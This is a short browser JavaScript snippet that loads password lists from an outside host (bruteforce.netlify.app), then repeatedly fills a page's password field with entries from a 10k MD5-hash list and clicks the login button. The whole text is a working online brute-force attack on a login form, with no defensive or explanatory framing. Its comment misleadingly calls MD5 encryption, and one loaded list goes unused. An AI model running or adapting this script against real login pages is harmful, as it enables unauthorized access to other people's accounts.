var script = document.createElement('script');
script.type = 'text/javascript';
script.src = 'https://bruteforce.netlify.app/no-enc-passwords/10k-passwords.js';
document.head.appendChild(script);
var script2 = document.createElement('script');
script2.type = 'text/javascript';
script2.src = 'https://bruteforce.netlify.app/enc-passwords/md5-10k-passwords.js';
document.head.appendChild(script2);

function Bruteforce(){


var MD5PasswordsLength = MD5Passwords.length;
var PasswordsLength = Passwords.length;

for(var i = 0; i < MD5PasswordsLength; i++){


password.value = MD5Passwords[i]; // For Password usually is MD5 Encryption
LoginBtn.click();
console.log("This password is beeing analysed: " + MD5Passwords[i])


} 


        
}
        
setTimeout(Bruteforce, 3000);


